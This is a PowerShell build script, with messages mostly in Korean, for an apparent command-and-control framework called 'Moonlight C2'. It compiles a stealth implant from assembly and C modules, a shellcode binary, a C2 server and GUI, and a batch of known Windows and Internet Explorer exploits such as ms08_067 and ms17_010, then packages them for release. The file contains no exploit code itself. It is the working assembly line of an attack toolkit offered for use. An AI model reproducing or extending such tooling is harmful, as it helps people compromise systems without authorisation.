# Moonlight C2 Framework - Master Build Script
# Builds all components: Client, Server, GUI, Exploits

param(
    [switch]$Client,
    [switch]$Server,
    [switch]$GUI,
    [switch]$Exploits,
    [switch]$Clean,
    [switch]$Package
)

$ErrorActionPreference = "Continue"

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "Moonlight C2 Framework - Build System v2.0" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# Check for build tools
Write-Host "[*] 빌드 도구 확인 중..." -ForegroundColor Yellow

$gccFound = $false
$nasmFound = $false

try {
    $gccVersion = gcc --version 2>&1 | Select-Object -First 1
    Write-Host "[+] GCC: $gccVersion" -ForegroundColor Green
    $gccFound = $true
} catch {
    Write-Host "[!] GCC를 찾을 수 없습니다" -ForegroundColor Red
}

try {
    $nasmVersion = nasm -v 2>&1
    Write-Host "[+] NASM: $nasmVersion" -ForegroundColor Green
    $nasmFound = $true
} catch {
    Write-Host "[!] NASM을 찾을 수 없습니다" -ForegroundColor Red
}

if (-not $gccFound -or -not $nasmFound) {
    Write-Host ""
    Write-Host "[!] 필요한 빌드 도구가 설치되어 있지 않습니다!" -ForegroundColor Red
    Write-Host ""
    Write-Host "설치 방법:" -ForegroundColor Yellow
    Write-Host "  1. 관리자 권한으로 PowerShell 실행" -ForegroundColor White
    Write-Host "  2. .\Install-BuildTools.ps1 실행" -ForegroundColor White
    Write-Host ""
    Write-Host "또는 수동으로 설치:" -ForegroundColor Yellow
    Write-Host "  - MinGW: https://winlibs.com/" -ForegroundColor White
    Write-Host "  - NASM: https://www.nasm.us/" -ForegroundColor White
    Write-Host ""
    exit 1
}

Write-Host ""

# Determine what to build
$buildAll = -not ($Client -or $Server -or $GUI -or $Exploits -or $Clean -or $Package)

if ($Clean) {
    Write-Host "[*] 빌드 아티팩트 정리 중..." -ForegroundColor Yellow
    
    if (Test-Path "bin") { Remove-Item "bin" -Recurse -Force }
    if (Test-Path "client\build") { Remove-Item "client\build" -Recurse -Force }
    if (Test-Path "server\build") { Remove-Item "server\build" -Recurse -Force }
    if (Test-Path "gui\build") { Remove-Item "gui\build" -Recurse -Force }
    if (Test-Path "exploits\build") { Remove-Item "exploits\build" -Recurse -Force }
    if (Test-Path "exploits\generated\build") { Remove-Item "exploits\generated\build" -Recurse -Force }
    
    Write-Host "[+] 정리 완료" -ForegroundColor Green
    Write-Host ""
    exit 0
}

# Create output directory
if (-not (Test-Path "bin")) {
    New-Item -ItemType Directory -Path "bin" -Force | Out-Null
}
if (-not (Test-Path "bin\exploits")) {
    New-Item -ItemType Directory -Path "bin\exploits" -Force | Out-Null
}

$buildSuccess = $true

# Build Client
if ($buildAll -or $Client) {
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "클라이언트 빌드 중..." -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    
    Push-Location "client"
    
    # Create build directories
    if (-not (Test-Path "build\obj")) {
        New-Item -ItemType Directory -Path "build\obj" -Force | Out-Null
    }
    
    # Compile assembly modules
    Write-Host "[*] Assembly 모듈 컴파일 중..." -ForegroundColor Yellow
    nasm -f win32 stealth.asm -o build\obj\stealth.obj
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    nasm -f win32 syscalls.asm -o build\obj\syscalls.obj
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    nasm -f win32 network_asm.asm -o build\obj\network_asm.obj
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    nasm -f win32 monitoring.asm -o build\obj\monitoring.obj
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    nasm -f win32 control.asm -o build\obj\control.obj
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    # Compile C sources
    Write-Host "[*] C 소스 컴파일 중..." -ForegroundColor Yellow
    gcc -m32 -c implant_enhanced.c -o build\obj\implant_enhanced.o -Wall -O2
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    gcc -m32 -c monitoring_control.c -o build\obj\monitoring_control.o -Wall -O2
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    # Link
    Write-Host "[*] 링킹 중..." -ForegroundColor Yellow
    gcc -m32 -o build\moonlight-implant-enhanced.exe `
        build\obj\implant_enhanced.o `
        build\obj\monitoring_control.o `
        build\obj\stealth.obj `
        build\obj\syscalls.obj `
        build\obj\network_asm.obj `
        build\obj\monitoring.obj `
        build\obj\control.obj `
        -lws2_32 -ladvapi32 -lgdi32 -luser32 -s
    
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "build\moonlight-implant-enhanced.exe" "..\bin\" -Force
        Write-Host "[+] 클라이언트 빌드 성공!" -ForegroundColor Green
        Write-Host "    출력: bin\moonlight-implant-enhanced.exe" -ForegroundColor White
    } else {
        Write-Host "[!] 클라이언트 빌드 실패" -ForegroundColor Red
        $buildSuccess = $false
    }
    
    # Build shellcode
    Write-Host "[*] Shellcode 빌드 중..." -ForegroundColor Yellow
    nasm -f bin shellcode.asm -o build\shellcode.bin
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "build\shellcode.bin" "..\bin\" -Force
        Write-Host "[+] Shellcode 빌드 성공!" -ForegroundColor Green
    }
    
    Pop-Location
    Write-Host ""
}

# Build Server
if ($buildAll -or $Server) {
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "서버 빌드 중..." -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    
    Push-Location "server"
    
    # Create build directories
    if (-not (Test-Path "build\obj")) {
        New-Item -ItemType Directory -Path "build\obj" -Force | Out-Null
    }
    
    # Compile assembly modules (from client)
    Write-Host "[*] Assembly 모듈 컴파일 중..." -ForegroundColor Yellow
    nasm -f win32 ..\client\network_asm.asm -o build\obj\network_asm.obj
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    # Compile C source
    Write-Host "[*] C 소스 컴파일 중..." -ForegroundColor Yellow
    gcc -m32 -c main_enhanced.c -o build\obj\main_enhanced.o -Wall -O2 -DMAX_CLIENTS=100
    if ($LASTEXITCODE -ne 0) { $buildSuccess = $false }
    
    # Link
    Write-Host "[*] 링킹 중..." -ForegroundColor Yellow
    gcc -m32 -o build\moonlight-server-enhanced.exe `
        build\obj\main_enhanced.o `
        build\obj\network_asm.obj `
        -lws2_32 -lpthread -s
    
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "build\moonlight-server-enhanced.exe" "..\bin\" -Force
        Write-Host "[+] 서버 빌드 성공!" -ForegroundColor Green
        Write-Host "    출력: bin\moonlight-server-enhanced.exe" -ForegroundColor White
    } else {
        Write-Host "[!] 서버 빌드 실패" -ForegroundColor Red
        $buildSuccess = $false
    }
    
    Pop-Location
    Write-Host ""
}

# Build GUI
if ($buildAll -or $GUI) {
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "GUI 빌드 중..." -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    
    Push-Location "gui"
    
    Write-Host "[*] GUI 컴파일 중..." -ForegroundColor Yellow
    gcc -m32 -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0501 -mwindows `
        main.c -o MoonlightC2-GUI.exe `
        -lcomctl32 -lws2_32 -lgdi32 -lcomdlg32 -s
    
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "MoonlightC2-GUI.exe" "..\bin\" -Force
        Write-Host "[+] GUI 빌드 성공!" -ForegroundColor Green
        Write-Host "    출력: bin\MoonlightC2-GUI.exe" -ForegroundColor White
    } else {
        Write-Host "[!] GUI 빌드 실패" -ForegroundColor Red
        $buildSuccess = $false
    }
    
    Pop-Location
    Write-Host ""
}

# Build Exploits
if ($buildAll -or $Exploits) {
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "Exploits 빌드 중..." -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    
    Push-Location "exploits"
    
    # Create build directory
    if (-not (Test-Path "build")) {
        New-Item -ItemType Directory -Path "build" -Force | Out-Null
    }
    
    # List of exploit source files
    $exploits = @(
        "ms03_026.c",
        "ms03_039.c",
        "ms05_039.c",
        "ms06_014.c",
        "ms06_040.c",
        "ms08_025.c",
        "ms08_067.c",
        "ms09_050.c",
        "ms10_015.c",
        "ms10_061.c",
        "ms11_046.c",
        "ms12_020.c",
        "ms17_010.c",
        "ie_ani_exploit.c",
        "ie_activex_exploit.c"
    )
    
    Write-Host "[*] Exploit 컴파일 중..." -ForegroundColor Yellow
    $exploitCount = 0
    
    foreach ($exploit in $exploits) {
        if (Test-Path $exploit) {
            $name = [System.IO.Path]::GetFileNameWithoutExtension($exploit)
            Write-Host "    - $exploit" -ForegroundColor Gray
            
            gcc -m32 $exploit -o "build\$name.exe" -lws2_32 -ladvapi32 -s 2>&1 | Out-Null
            
            if ($LASTEXITCODE -eq 0) {
                Copy-Item "build\$name.exe" "..\bin\exploits\" -Force
                $exploitCount++
            }
        }
    }
    
    Write-Host "[+] $exploitCount 개의 Exploit 빌드 성공!" -ForegroundColor Green
    
    Pop-Location
    Write-Host ""
}

# Build summary
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "빌드 요약" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

if (Test-Path "bin\moonlight-implant-enhanced.exe") {
    $size = (Get-Item "bin\moonlight-implant-enhanced.exe").Length / 1KB
    Write-Host "[+] Client:  bin\moonlight-implant-enhanced.exe ($([math]::Round($size, 2)) KB)" -ForegroundColor Green
}

if (Test-Path "bin\moonlight-server-enhanced.exe") {
    $size = (Get-Item "bin\moonlight-server-enhanced.exe").Length / 1KB
    Write-Host "[+] Server:  bin\moonlight-server-enhanced.exe ($([math]::Round($size, 2)) KB)" -ForegroundColor Green
}

if (Test-Path "bin\MoonlightC2-GUI.exe") {
    $size = (Get-Item "bin\MoonlightC2-GUI.exe").Length / 1KB
    Write-Host "[+] GUI:     bin\MoonlightC2-GUI.exe ($([math]::Round($size, 2)) KB)" -ForegroundColor Green
}

if (Test-Path "bin\exploits") {
    $exploitCount = (Get-ChildItem "bin\exploits" -Filter "*.exe").Count
    Write-Host "[+] Exploits: $exploitCount 개 (bin\exploits\)" -ForegroundColor Green
}

Write-Host ""

if ($buildSuccess) {
    Write-Host "============================================" -ForegroundColor Green
    Write-Host "빌드 완료!" -ForegroundColor Green
    Write-Host "============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "다음 단계:" -ForegroundColor Yellow
    Write-Host "  1. 서버 시작: .\bin\moonlight-server-enhanced.exe" -ForegroundColor White
    Write-Host "  2. GUI 실행: .\bin\MoonlightC2-GUI.exe" -ForegroundColor White
    Write-Host "  3. 문서 참조: README.md, COMMANDS.md" -ForegroundColor White
    Write-Host ""
} else {
    Write-Host "============================================" -ForegroundColor Red
    Write-Host "일부 컴포넌트 빌드 실패" -ForegroundColor Red
    Write-Host "============================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "위의 오류 메시지를 확인하세요" -ForegroundColor Yellow
    Write-Host ""
}

# Package option
if ($Package) {
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "릴리즈 패키지 생성 중..." -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $releaseDir = "release\moonlight-c2-$timestamp"
    
    if (Test-Path "release") { Remove-Item "release" -Recurse -Force }
    New-Item -ItemType Directory -Path $releaseDir -Force | Out-Null
    New-Item -ItemType Directory -Path "$releaseDir\bin" -Force | Out-Null
    New-Item -ItemType Directory -Path "$releaseDir\docs" -Force | Out-Null
    
    # Copy binaries
    Copy-Item "bin\*" "$releaseDir\bin\" -Recurse -Force
    
    # Copy documentation
    Copy-Item "README.md" "$releaseDir\" -Force
    Copy-Item "COMMANDS.md" "$releaseDir\" -Force
    Copy-Item "BUILD_GUIDE.md" "$releaseDir\" -Force
    Copy-Item "ASSEMBLY_GUIDE.md" "$releaseDir\" -Force
    Copy-Item "LICENSE" "$releaseDir\" -Force
    
    if (Test-Path "docs") {
        Copy-Item "docs\*" "$releaseDir\docs\" -Force
    }
    
    # Create archive
    $zipFile = "release\moonlight-c2-$timestamp.zip"
    Compress-Archive -Path $releaseDir -DestinationPath $zipFile -Force
    
    Write-Host "[+] 릴리즈 패키지 생성 완료!" -ForegroundColor Green
    Write-Host "    파일: $zipFile" -ForegroundColor White
    Write-Host ""
}
